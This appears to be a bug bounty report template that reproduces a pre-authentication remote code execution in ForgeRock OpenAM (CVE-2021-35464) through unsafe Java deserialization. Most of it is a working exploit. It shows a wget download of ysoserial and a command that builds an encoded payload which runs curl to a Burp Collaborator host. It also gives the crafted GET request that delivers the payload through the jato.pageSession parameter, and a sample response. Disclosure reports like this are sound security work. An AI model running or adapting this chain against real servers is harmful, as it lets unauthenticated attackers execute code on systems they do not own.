
## Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464)

RCE is possible thanks to unsafe Java deserialization in the Jato framework used by OpenAM.

## Steps To Reproduce

Vulnerable OpenAM: $URL
Target domain: $DOMAIN

First we need to build the payload, I will use the **curl** command but it could be another system command:
 1. Download this jar file 
``wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar``

 2. Create payload  ``java -jar ysoserial-master-SNAPSHOT.jar Click1 "curl https://XXX.burpcollaborator.net" | (echo -ne \\x00 && cat) | base64 | tr '/+' '_-' | tr -d '=' | tr -d '\n' > payload.txt`` 

You need to change the burp Collaborator id (or *Interactsh*) to test it properly. 
The payload is now saved in the payload.txt file. 

Now we need to use the following request:

```
GET /openam/ccversion/Version?jato.pageSession=XYZ HTTP/1.1
Host: 127.0.0.1
Content-Length: 4



```
Use the file attached on this email if the request doesn't work (pay attention to the empty lines at the bottom)
Replace **XYZ** by the payload saved into the payload.txt file. 

The response
```
HTTP/1.1 302 Found
Date: Fri, 02 Jul 2021 04:12:34 GMT
X-Powered-By: Servlet/3.0
Cache-Control: private
Location: http://127.0.0.1:80/sso/base/AMInvalidURL
Content-Length: 0
Content-Language: en-US

```
The HTTP Request sent the collaborator :


$SCREENSHOTS

## Impact

- An unauthenticated, 3rd-party attacker or adversary can execute remote code

 
### Supporting Material/References
- https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464



